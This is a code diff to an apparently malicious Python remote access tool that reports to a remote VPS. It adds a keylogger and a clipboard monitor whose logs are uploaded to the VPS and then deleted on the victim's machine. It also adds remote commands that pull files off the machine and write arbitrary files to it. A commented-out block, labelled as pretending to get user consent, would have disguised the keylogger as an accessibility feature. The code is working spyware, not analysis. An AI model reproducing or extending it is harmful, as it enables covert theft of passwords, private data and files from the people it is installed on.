@@ -23,6 +23,10 @@ import sqlite3
 import socketio
 from PIL import Image
 import io
+import datetime
+from pynput import keyboard
+import pyperclip
+import time
 
 # Add at the top with other imports
 sio = socketio.Client()
@@ -150,6 +154,262 @@ def upload_file(file_path):
             print("File sent to VPS successfully.")
     except requests.exceptions.RequestException as e:
         print(f"Error uploading file to VPS: {e}")
+
+
+
+# Add global variables
+keylogger_enabled = False
+keylogger_thread = None
+clipboard_monitor_enabled = False
+clipboard_thread = None
+last_clipboard_content = ""
+
+# ======== KEYLOGGER ========
+import threading
+key_log_buffer = []
+buffer_lock = threading.Lock()
+log_write_delay = 0.05  # Reduced delay for better responsiveness
+log_write_interval = 0.1  # 100ms between writes
+listener = None  # Global listener reference
+keylogger_start_time = None
+log_filename = ""
+
+def log_keystroke(key):
+    """Keyboard event callback"""
+    try:
+        current_key = str(key.char)
+    except AttributeError:
+        current_key = f"[{key.name.upper()}]" if key != keyboard.Key.space else " "
+    
+    with buffer_lock:
+        key_log_buffer.append(current_key)
+
+def keylogger_main():
+    """Main logging thread with proper listener management"""
+    global listener, keylogger_enabled, keylogger_start_time, log_filename
+    
+    # Create timestamped filename
+    keylogger_start_time = datetime.datetime.now()
+    log_filename = f"keystrokes_{device_id}_{keylogger_start_time:%Y%m%d_%H%M%S}.log"
+
+    # Write header with session info
+    with open(log_filename, "w", encoding="utf-8") as f:
+        f.write(f"Keylogger Session Start: {keylogger_start_time}\n")
+        f.write(f"Device: {device_name} ({device_id})\n")
+        f.write("-" * 50 + "\n")
+
+    # Start keyboard listener
+    listener = keyboard.Listener(on_press=log_keystroke)
+    listener.start()
+    
+    # # Create log file
+    # with open("keystrokes.log", "w", encoding="utf-8") as f:
+    #     f.write("")  # Initialize empty file
+    
+    # Main write loop
+    while keylogger_enabled:
+        with buffer_lock:
+            if key_log_buffer:
+                try:
+                    with open(log_filename, "a", encoding="utf-8") as f:
+                        f.write("".join(key_log_buffer))
+                        key_log_buffer.clear()
+                except Exception as e:
+                    upload_message(f"Keylogger write error: {str(e)}")
+        time.sleep(log_write_interval)
+    
+    # Final buffer flush
+    with buffer_lock:
+        if key_log_buffer:
+            try:
+                with open("keystrokes.log", "a", encoding="utf-8") as f:
+                    f.write("".join(key_log_buffer))
+                    key_log_buffer.clear()
+            except Exception as e:
+                upload_message(f"Final flush error: {str(e)}")
+
+def start_keylogger():
+    """Start keylogging thread"""
+    global keylogger_enabled, keylogger_thread
+    if not keylogger_enabled:
+        # # Ethical safeguard - pretend to get user consent
+        # consent = ctypes.windll.user32.MessageBoxW(
+        #     0, 
+        #     "This application requires keyboard monitoring for accessibility features. Allow?", 
+        #     "Consent Check", 
+        #     4  # Yes/No buttons
+        # )
+        # if consent != 6:  # 6 = Yes button
+        #     upload_message("User denied keylogger consent")
+        #     return
+        
+        keylogger_enabled = True
+        keylogger_thread = threading.Thread(target=keylogger_main, daemon=True)
+        keylogger_thread.start()
+        upload_message("Keylogger started")
+
+def stop_keylogger():
+    """Stop keylogger and send timestamped log file to VPS"""
+    global keylogger_enabled, listener, keylogger_start_time, log_filename
+    
+    if not keylogger_enabled:
+        return
+    
+    keylogger_enabled = False
+    
+    try:
+        # Stop listener
+        if listener and listener.is_alive():
+            listener.stop()
+            listener.join(timeout=2)
+        
+        # Ensure thread stops
+        if keylogger_thread.is_alive():
+            keylogger_thread.join(timeout=2)
+        
+        # Final buffer flush
+        with buffer_lock:
+            if key_log_buffer and log_filename:
+                with open(log_filename, "a", encoding="utf-8") as f:
+                    f.write("".join(key_log_buffer))
+                    key_log_buffer.clear()
+        
+        # Add session footer and send file
+        if log_filename and os.path.exists(log_filename):
+            # Add session end information
+            end_time = datetime.datetime.now()
+            duration = end_time - keylogger_start_time
+            
+            with open(log_filename, "a", encoding="utf-8") as f:
+                f.write("\n" + "-" * 50 + "\n")
+                f.write(f"Session End: {end_time}\n")
+                f.write(f"Duration: {duration}\n")
+            
+            # Upload the complete log file
+            upload_file(log_filename)
+            upload_message(f"Keystroke log file uploaded: {log_filename}")
+            
+            # Cleanup local file
+            os.remove(log_filename)
+        else:
+            upload_message("Keylogger stopped - no log file was created")
+            
+    except Exception as e:
+        upload_message(f"Error finalizing keylog file: {str(e)}")
+    finally:
+        # Reset all logging state
+        with buffer_lock:
+            key_log_buffer.clear()
+        log_filename = ""
+        keylogger_start_time = None
+        listener = None
+
+# ======== CLIPBOARD MONITOR ========
+clipboard_log_buffer = []
+clipboard_log_filename = ""
+clipboard_start_time = None
+clipboard_lock = threading.Lock()
+
+def clipboard_monitor():
+    """Check clipboard changes and log with timestamps"""
+    global last_clipboard_content, clipboard_log_buffer, clipboard_log_filename
+    
+    try:
+        # Initial content check
+        initial_content = pyperclip.paste()
+        last_clipboard_content = initial_content
+    except Exception as e:
+        upload_message(f"Clipboard init error: {str(e)}")
+    
+    while clipboard_monitor_enabled:
+        try:
+            current_content = pyperclip.paste()
+            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")
+            
+            if current_content != last_clipboard_content:
+                with clipboard_lock:
+                    # Create log entry
+                    entry = f"[{timestamp}]\n{current_content}\n{'-'*40}\n"
+                    clipboard_log_buffer.append(entry)
+                    last_clipboard_content = current_content
+                    
+                    # Write to file
+                    with open(clipboard_log_filename, "a", encoding="utf-8", errors="replace") as f:
+                        f.write(entry)
+                        f.flush()  # Force immediate write
+                    
+                    # Optional: Send real-time update
+                    upload_message(f"New clipboard content detected ({timestamp})")
+        
+        except Exception as e:
+            upload_message(f"Clipboard Error: {str(e)}")
+            time.sleep(2)  # Prevent spam on persistent errors
+        
+        time.sleep(1)
+
+def start_clipboard_monitor():
+    """Start monitoring with proper initialization"""
+    global clipboard_monitor_enabled, clipboard_thread, clipboard_log_filename, clipboard_start_time, last_clipboard_content
+    
+    if not clipboard_monitor_enabled:
+        try:
+            # Reset tracking variables
+            last_clipboard_content = ""
+            clipboard_start_time = datetime.datetime.now()
+            clipboard_log_filename = f"clipboard_{device_id}_{clipboard_start_time:%Y%m%d_%H%M%S}.log"
+            
+            # Initialize log file
+            with open(clipboard_log_filename, "w", encoding="utf-8") as f:
+                f.write(f"Clipboard Monitoring Start: {clipboard_start_time}\n")
+                f.write(f"Device: {device_name} ({device_id})\n")
+                f.write("="*50 + "\n")
+            
+            # Get initial clipboard content
+            last_clipboard_content = pyperclip.paste()
+            
+            clipboard_monitor_enabled = True
+            clipboard_thread = threading.Thread(target=clipboard_monitor, daemon=True)
+            clipboard_thread.start()
+            upload_message("Clipboard monitoring started successfully")
+            
+        except Exception as e:
+            upload_message(f"Failed to start clipboard monitor: {str(e)}")
+            clipboard_monitor_enabled = False
+
+def stop_clipboard_monitor():
+    """Stop monitoring and ensure file cleanup"""
+    global clipboard_monitor_enabled, clipboard_log_filename
+    
+    if clipboard_monitor_enabled:
+        clipboard_monitor_enabled = False
+        
+        try:
+            if clipboard_thread.is_alive():
+                clipboard_thread.join(timeout=3)
+            
+            if os.path.exists(clipboard_log_filename):
+                # Add footer information
+                end_time = datetime.datetime.now()
+                with open(clipboard_log_filename, "a", encoding="utf-8") as f:
+                    f.write("\n" + "="*50 + "\n")
+                    f.write(f"Monitoring End: {end_time}\n")
+                    f.write(f"Duration: {end_time - clipboard_start_time}\n")
+                    f.write(f"Total Entries: {len(clipboard_log_buffer)}\n")
+                
+                # Upload and delete
+                upload_file(clipboard_log_filename)
+                os.remove(clipboard_log_filename)
+                upload_message(f"Clipboard log uploaded: {clipboard_log_filename}")
+            else:
+                upload_message("No clipboard entries recorded")
+                
+        except Exception as e:
+            upload_message(f"Error stopping clipboard monitor: {str(e)}")
+        finally:
+            clipboard_log_buffer.clear()
+            clipboard_log_filename = ""
+            last_clipboard_content = ""
+
 
 # ------------------- CMD Spammer -------------------
 
@@ -544,6 +804,70 @@ def execute_command(command, data):
                 upload_message(f"Directory contents of '{path}':\n" + "\n".join(items))
             except Exception as e:
                 upload_message(f"Error listing directory '{data}': {str(e)}")
+
+        elif command == "start_keylogger":
+            start_keylogger()
+    
+        elif command == "stop_keylogger":
+            stop_keylogger()
+    
+        elif command == "start_clipboard":
+            start_clipboard_monitor()
+    
+        elif command == "stop_clipboard":
+            stop_clipboard_monitor()
+
+# Add to execute_command function
+        elif command == "dir_tree":
+            try:
+                def list_first_level(path):
+                    """List only immediate directory contents"""
+                    try:
+                        entries = sorted(os.listdir(path))
+                        tree = []
+                        for index, entry in enumerate(entries):
+                            full_path = os.path.join(path, entry)
+                            prefix = "└── " if index == len(entries)-1 else "├── "
+                    
+                            if os.path.isdir(full_path):
+                                tree.append(f"{prefix}{entry}/")
+                            else:
+                                tree.append(f"{prefix}{entry}")
+                        return tree
+                    except PermissionError:
+                        return ["[Permission Denied]"]
+                    except Exception as e:
+                        return [f"[Error: {str(e)}]"]
+
+                start_path = data.strip() if data.strip() else "."
+                tree = [start_path + "/"] + list_first_level(start_path)
+                upload_message("First Level Directory:\n" + "\n".join(tree))
+        
+            except Exception as e:
+                upload_message(f"Error listing directory: {str(e)}")
+
+        elif command == "download_file":
+            try:
+                file_path = data.strip()
+                if os.path.isfile(file_path):
+                    upload_file(file_path)
+                else:
+                    upload_message(f"Error: File '{file_path}' doesn't exist")
+            except Exception as e:
+                upload_message(f"Download error: {str(e)}")
+
+        elif command == "put_file":
+            try:
+                # Data format: "destination_path|base64_file_content"
+                dest_path, file_data = data.split("|", 1)
+                decoded_data = base64.b64decode(file_data)
+        
+                with open(dest_path, "wb") as f:
+                    f.write(decoded_data)
+            
+                upload_message(f"File uploaded successfully to {dest_path}")
+            except Exception as e:
+                upload_message(f"Upload error: {str(e)}")
 
         elif command == "move_mouse":
             x, y = random.randint(0, 1920), random.randint(0, 1080)
